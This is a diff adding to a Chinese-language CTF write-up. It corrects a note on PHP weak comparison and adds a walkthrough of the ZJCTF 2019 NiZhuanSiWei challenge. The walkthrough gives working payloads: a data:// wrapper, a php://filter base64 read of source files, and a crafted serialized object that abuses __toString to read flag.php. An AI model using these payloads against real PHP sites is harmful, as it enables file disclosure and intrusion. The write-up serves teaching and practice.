@@ -115,7 +115,7 @@ else {
 
    在PHP中:
 
-   = = 为弱相等，即当整数和字符串类型相比较时。会先将字符串转化为整数然后再进行比较。比如a=123和b=123admin456进行= =比较时。则b只会截取前面的整数部分。即b转化成123
+   == 为弱相等，即当整数和字符串类型相比较时。会先将字符串转化为整数然后再进行比较。比如a=123和b=123admin456进行==比较时。则b只会截取前面的整数部分。即b转化成123
 
    所以，这里的a = = b是返回True
 
@@ -225,3 +225,77 @@ if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['para
 
    0e940624217856561557816327384675
 7. 在这里我们就用md5无法处理数组，然后都返回null，null=null然后就绕过了这个。
+
+# [ZJCTF 2019]NiZhuanSiWei 1
+
+1. 打开靶机发现直接就是php
+```php
+<?php  
+$text = $_GET["text"];
+$file = $_GET["file"];
+$password = $_GET["password"];
+if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
+    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
+    if(preg_match("/flag/",$file)){
+        echo "Not now!";
+        exit(); 
+    }else{
+        include($file);  //useless.php
+        $password = unserialize($password);
+        echo $password;
+    }
+}
+else{
+    highlight_file(__FILE__);
+}
+?> 
+```
+2. 我们需要get方式提交参数，text、file、password
+```php
+if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"))
+// 要求text不为空，这是肯定的，主要看下一句，file_get_contents($text,'r')==="welcome to the zjctf",从文件里读取字符串，还要和welcome to the zjctf相等
+// 这时候就用到了我们的data:// 写入协议了
+```
+3. 构建第一个payload:`?text=data://text/plain,welcome to the zjctf`
+4. 下面我们不能用flag.php来访问，因为被正则匹配，我们就拿不到反序列化后的password了。
+
+   下一个我们就该反序列化password了，但是我们又看到了useless.php文件包含，在这之前我们需要先读取里面的源码，然后将password反序列化出来。
+
+   于是我们构造第二个payload:`file=php://filter/read=convert.base64-encode/resource=useless.php`
+
+   这时候你会得到一串base64的编码，然后我们解码就得到了源码 
+```php
+<?php 
+ 
+class Flag{  //flag.php 
+    public $file; 
+    public function __tostring(){ 
+        if(isset($this->file)){ 
+            echo file_get_contents($this->file);
+            echo "<br>";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        } 
+    } 
+} 
+?> 
+```
+5. 分析可知，flag 应该在 flag.php 中，但是直接访问得不到结果；__tostring当类被当成字符串的时候自动调用，考虑到存在echo $password，因此这题的反序列化利用点是这个。
+```php
+<?php 
+ 
+class Flag{  //flag.php 
+    public $file="flag.php"; 
+    public function __tostring(){ 
+        if(isset($this->file)){ 
+            echo file_get_contents($this->file);
+            echo "<br>";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        } 
+    } 
+} 
+$password=new Flag();
+echo serialize($password);
+?>  
+```
+6. 得到`O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`
+7. 重新构建payload:`?text=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}`,得到flag
